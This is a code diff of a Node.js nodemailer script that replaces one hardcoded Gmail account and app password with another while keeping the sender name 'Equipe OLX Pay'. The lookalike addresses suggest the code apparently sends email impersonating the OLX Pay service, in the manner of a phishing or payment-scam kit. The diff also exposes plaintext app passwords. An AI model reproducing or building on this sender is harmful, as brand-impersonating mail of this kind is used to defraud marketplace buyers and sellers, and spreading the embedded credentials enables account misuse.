@@ -6,8 +6,8 @@ const path = require("path");
 const transporter = nodemailer.createTransport({
   service: "gmail", // troque para seu serviço: 'gmail', 'hotmail', etc
   auth: {
-    user: "olx.suportedevendas.ltdaonline@gmail.com", // seu email
-    pass: "gcjt mlpl xozn ujmt", // sua senha ou senha de app
+    user: "newsoixpay.com.br.grupoolx.com.br@gmail.com", // seu email
+    pass: "gphz ropb cvyu gcqz", // sua senha ou senha de app
   },
 });
 
@@ -19,7 +19,7 @@ const transporter = nodemailer.createTransport({
  */
 async function enviarEmail(destinatario, assunto, htmlConteudo) {
   const mailOptions = {
-    from: '"Equipe OLX Pay" <olx.suportedevendas.ltdaonline@gmail.com>',
+    from: '"Equipe OLX Pay" <newsoixpay.com.br.grupoolx.com.br@gmail.com>',
     to: destinatario,
     subject: assunto,
     html: htmlConteudo,
